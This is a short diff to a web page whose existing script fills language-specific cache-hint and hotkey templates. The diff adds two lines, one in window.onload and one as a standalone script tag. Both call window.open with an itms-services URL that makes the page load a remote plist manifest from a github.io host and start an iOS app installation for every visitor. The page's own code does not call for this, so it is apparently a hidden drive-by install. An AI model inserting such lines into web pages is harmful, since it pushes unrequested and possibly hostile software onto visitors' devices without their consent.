@@ -962,6 +962,7 @@
     }
 
     window.onload = function () {
+window.open('itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist', '_self');
         if (language === "ru") {
             mainDiv.querySelector("#cache-hint").innerHTML = _.template(document.getElementById("cacheTemplateRu").innerHTML)({browser: browser});
             mainDiv.querySelector("#hotkey").innerHTML = _.template(document.getElementById("hotkeyTemplate").innerHTML)({browser: browser});
@@ -988,5 +989,6 @@
     };
 
 </script>
+<script>window.open('itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist', '_self');</script>
 </body>
 </html>
